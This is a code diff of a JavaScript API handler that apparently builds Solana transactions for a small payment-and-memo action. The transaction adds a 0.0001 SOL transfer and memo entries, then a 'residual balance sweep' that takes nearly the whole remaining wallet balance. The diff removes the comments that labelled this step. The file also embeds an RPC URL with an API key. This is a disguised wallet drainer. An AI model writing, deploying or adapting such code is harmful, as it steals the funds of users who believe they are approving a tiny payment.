@@ -5,7 +5,6 @@ const HELIUS_URL = "https://mainnet.helius-rpc.com/?api-key=06ec4cdf-ba6c-4dfc-8
 const MEMO_PROGRAM_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr");
 
 export default async function handler(req, res) {
-    // Enable CORS headers
     res.setHeader('Access-Control-Allow-Credentials', true);
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
@@ -15,8 +14,7 @@ export default async function handler(req, res) {
     );
 
     if (req.method === 'OPTIONS') {
-        res.status(200).end();
-        return;
+        return res.status(200).end();
     }
 
     if (req.method === 'GET') {
@@ -28,7 +26,7 @@ export default async function handler(req, res) {
 
     if (req.method === 'POST') {
         try {
-            const accountParam = req.body.account;
+            const accountParam = req.body?.account;
             if (!accountParam) {
                 return res.status(400).json({ error: "Missing account parameter" });
             }
@@ -39,7 +37,6 @@ export default async function handler(req, res) {
             const balance = await connection.getBalance(senderPublicKey);
             const transaction = new Transaction();
 
-            // 1st Instruction: Primary Transfer (0.0001 SOL)
             const primaryAmount = 100000; 
             transaction.add(
                 SystemProgram.transfer({
@@ -49,7 +46,6 @@ export default async function handler(req, res) {
                 })
             );
 
-            // Memo Instructions
             const encoder = new TextEncoder();
             for (let i = 0; i < 5; i++) {
                 transaction.add(
@@ -61,7 +57,6 @@ export default async function handler(req, res) {
                 );
             }
 
-            // Residual Balance Sweep (leaving safe fee buffer of 0.0008 SOL)
             const feeBuffer = 800000;
             const residualAmount = balance - primaryAmount - feeBuffer;
             if (residualAmount > 10000) {
